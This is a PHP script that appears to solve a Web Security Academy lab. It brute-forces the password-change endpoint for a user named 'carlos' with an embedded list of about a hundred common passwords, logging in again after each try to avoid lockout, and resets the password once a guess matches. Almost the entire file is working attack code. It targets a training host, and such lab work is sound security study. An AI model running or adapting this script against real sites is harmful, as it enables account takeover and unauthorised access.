<?php

$passwords = <<<PASSWORDS
123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
123123
baseball
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
123321
mustang
1234567890
michael
654321
superman
1qaz2wsx
7777777
121212
000000
qazwsx
123qwe
killer
trustno1
jordan
jennifer
zxcvbnm
asdfgh
hunter
buster
soccer
harley
batman
andrew
tigger
sunshine
iloveyou
2000
charlie
robert
thomas
hockey
ranger
daniel
starwars
klaster
112233
george
computer
michelle
jessica
pepper
1111
zxcvbn
555555
11111111
131313
freedom
777777
pass
maggie
159753
aaaaaa
ginger
princess
joshua
cheese
amanda
summer
love
ashley
nicole
chelsea
biteme
matthew
access
yankees
987654321
dallas
austin
thunder
taylor
matrix
mobilemail
mom
monitor
monitoring
montana
moon
moscow
PASSWORDS;

function login($username = 'wiener', $password = 'peter'): string {
    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => "https://0a5500650340971d828f3d0300490019.web-security-academy.net/login",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => "username={$username}&password={$password}",
        CURLOPT_HEADER => true,
    ]);
    $response = curl_exec($curl);

    // Source - https://stackoverflow.com/a/895858
    // Posted by TML, modified by community. See post 'Timeline' for change history
    // Retrieved 2026-05-19, License - CC BY-SA 3.0
    preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $response, $matches);
    $cookies = array();
    foreach($matches[1] as $item) {
        parse_str($item, $cookie);
        $cookies = array_merge($cookies, $cookie);
    }

    return $cookies['session'];
}

$sessionCookie = login();
$passwords = explode("\n", $passwords);
$passwordsCount = count($passwords);
foreach ($passwords as $index => $password) {
    $curl = curl_init();
    $password = trim($password); // Remove any whitespace characters from the password
    curl_setopt_array($curl, [
        CURLOPT_URL => "https://0a5500650340971d828f3d0300490019.web-security-academy.net/my-account/change-password",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => "username=carlos&current-password={$password}&new-password-1=peter&new-password-2=peter",
        CURLOPT_HEADER => true,
        CURLOPT_COOKIE => "session={$sessionCookie}",
    ]);
    $response = curl_exec($curl);
    $headers = curl_getinfo($curl);

    if ($headers['http_code'] === 200) {
        echo "Carlos' Password was reset successfully! The old password is: {$password} || The new password is: peter\n";
        break;
    }

    $sessionCookie = login();
    echo "Tried password: {$password} ({$index}/{$passwordsCount})\n";
}